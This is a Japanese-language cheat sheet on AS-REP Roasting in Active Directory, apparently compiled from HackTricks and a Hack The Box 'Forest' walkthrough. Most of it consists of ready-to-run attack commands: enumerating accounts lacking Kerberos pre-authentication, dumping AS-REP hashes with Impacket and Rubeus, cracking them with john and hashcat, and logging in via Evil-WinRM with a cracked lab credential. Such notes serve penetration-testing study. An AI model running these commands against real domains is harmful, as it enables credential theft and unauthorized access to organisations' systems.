# ASREPRoast攻撃
ASREPRoast攻撃は、Kerberosの事前認証必須属性(DONT_REQ_PREAUTH)を持たないユーザを探します。 つまり、誰もがそれらのユーザに代わってDCにAS_REQリクエストを送信し、AS_REPメッセージを受け取ることができるということです。   
[Hacktrick](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
```
#脆弱なユーザーの列挙（ドメイン資格情報が必要）
$ Get-DomainUser -PreauthNotRequired -verbose #PowerViewを使用して脆弱なユーザーを一覧表示する
```
AS_REPメッセージを要求

Linuxの場合
```
# usernames.txt内の全てのユーザー名を試す
$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#ドメイン資格情報を使用してターゲットを抽出し、それらをターゲットにする
$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
Windowsの場合
```
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

```
$ python3 GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```
>-usersfile: enum4linuxコマンドにて列挙したユーザーリストファイルusernames.txtを使用します。  
-format: パスワードハッシュのフォーマットとして、john形式にて出力させます。   
-outputfile: 結果をhtb-forest.txtファイルに出力させます。   

例）
```
kali@kali:~/impacket/examples$ python3 GetNPUsers.py HTB.local/ -usersfile ~/OffsecVM/hackthebox/Forest/usernames.txt -format john -outputfile htb-forest.txt -no-pass -dc-ip 10.10.10.161
#ユーザー名： svc-alfresco
#パスワード： s3rvice
# john
$ john htb-forest.txt --wordlist=/home/kali/OffsecVM/rockyou.txt
#hashcat
$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```

WinRM(5985/tcp)が開いていればEvil-WinRMで接続
```
kali@kali:~/evil-winrm$ ./evil-winrm.rb -i forest.htb -u svc-alfresco -p s3rvice
```